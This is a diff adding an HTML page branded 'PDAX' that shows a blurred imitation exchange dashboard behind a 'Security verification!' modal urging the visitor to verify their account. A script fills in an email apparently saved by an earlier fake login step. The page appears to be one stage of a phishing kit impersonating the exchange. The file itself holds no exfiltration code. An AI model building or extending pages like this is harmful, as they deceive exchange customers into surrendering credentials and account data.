@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<base target="_top" />
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>PDAX</title>
+<style>
+  :root { --green:#2bb24c; }
+  * { box-sizing:border-box; }
+  html,body { margin:0; height:100%; }
+  body { font-family:"Poppins",system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif; background:#f6f7f8; overflow:hidden; }
+
+  /* Blurred dashboard mock behind the overlay */
+  .bg { position:fixed; inset:0; filter:blur(7px); opacity:.6; pointer-events:none; padding:28px; }
+  .bar { height:52px; background:#fff; border-radius:8px; margin-bottom:24px; box-shadow:0 1px 6px rgba(0,0,0,.05); }
+  .cols { display:grid; grid-template-columns:1fr 1.4fr; gap:28px; max-width:1300px; margin:0 auto; }
+  .card { background:#fff; border-radius:12px; box-shadow:0 1px 8px rgba(0,0,0,.05); padding:22px; }
+  .pill { height:18px; width:60%; background:#e9ecef; border-radius:6px; margin-bottom:14px; }
+  .pill.sm { width:35%; }
+  .grid { display:grid; grid-template-columns:repeat(4,1fr); gap:18px; margin-top:18px; }
+  .coin { text-align:center; }
+  .dot { width:40px; height:40px; border-radius:50%; margin:0 auto 8px; }
+  .g { background:#2bb24c; } .y { background:#f0b429; } .b { background:#3b82f6; } .o { background:#f97316; }
+  .line { display:flex; align-items:center; gap:12px; padding:14px 0; border-bottom:1px solid #f0f1f3; }
+  .line .dot { width:34px; height:34px; margin:0; }
+  .line .txt { flex:1; }
+
+  /* Overlay */
+  .overlay { position:fixed; inset:0; display:flex; align-items:center; justify-content:center; padding:20px; }
+  .modal { background:#fff; border-radius:12px; box-shadow:0 20px 60px rgba(0,0,0,.18); width:100%; max-width:600px; padding:44px 48px; }
+  .modal h2 { font-size:34px; font-weight:600; color:#1f2328; margin:0 0 16px; }
+  .modal p { font-size:18px; line-height:1.55; color:#6b7178; margin:0 0 20px; }
+  .modal .email { font-size:19px; font-weight:600; color:#1f2328; margin:0 0 26px; word-break:break-all; }
+  .verify-btn { width:100%; padding:17px; border:0; border-radius:8px; background:var(--green); color:#fff; font-size:19px; font-weight:600; cursor:pointer; transition:background .15s; }
+  .verify-btn:hover { background:#249c43; }
+  @media (max-width:560px){ .modal{ padding:32px 24px; } .modal h2{ font-size:28px; } }
+</style>
+</head>
+<body>
+  <div class="bg">
+    <div class="bar"></div>
+    <div class="cols">
+      <div>
+        <div class="card">
+          <div class="pill"></div>
+          <div class="pill sm"></div>
+        </div>
+        <div class="card" style="margin-top:20px;">
+          <div class="grid">
+            <div class="coin"><div class="dot g"></div><div class="pill" style="width:80%;margin:0 auto;height:10px;"></div></div>
+            <div class="coin"><div class="dot g"></div><div class="pill" style="width:80%;margin:0 auto;height:10px;"></div></div>
+            <div class="coin"><div class="dot y"></div><div class="pill" style="width:80%;margin:0 auto;height:10px;"></div></div>
+            <div class="coin"><div class="dot g"></div><div class="pill" style="width:80%;margin:0 auto;height:10px;"></div></div>
+            <div class="coin"><div class="dot b"></div><div class="pill" style="width:80%;margin:0 auto;height:10px;"></div></div>
+            <div class="coin"><div class="dot o"></div><div class="pill" style="width:80%;margin:0 auto;height:10px;"></div></div>
+            <div class="coin"><div class="dot g"></div><div class="pill" style="width:80%;margin:0 auto;height:10px;"></div></div>
+          </div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="pill sm"></div>
+        <div class="line"><div class="dot g"></div><div class="txt"><div class="pill" style="height:12px;"></div></div></div>
+        <div class="line"><div class="dot y"></div><div class="txt"><div class="pill sm" style="height:12px;"></div></div></div>
+        <div class="line"><div class="dot b"></div><div class="txt"><div class="pill" style="height:12px;"></div></div></div>
+        <div class="line"><div class="dot g"></div><div class="txt"><div class="pill sm" style="height:12px;"></div></div></div>
+        <div class="line"><div class="dot g"></div><div class="txt"><div class="pill" style="height:12px;"></div></div></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="overlay">
+    <div class="modal">
+      <h2>Security verification!</h2>
+      <p>The next step is to verify your account with a few simple steps so you are ready to start your transactions.</p>
+      <p class="email" id="email">your email</p>
+      <button class="verify-btn" type="button" id="verify">Verify my account</button>
+    </div>
+  </div>
+
+  <script>
+    try {
+      var saved = localStorage.getItem('pdax_login_email');
+      if (saved) document.getElementById('email').textContent = saved;
+    } catch (e) {}
+  </script>
+</body>
+</html>
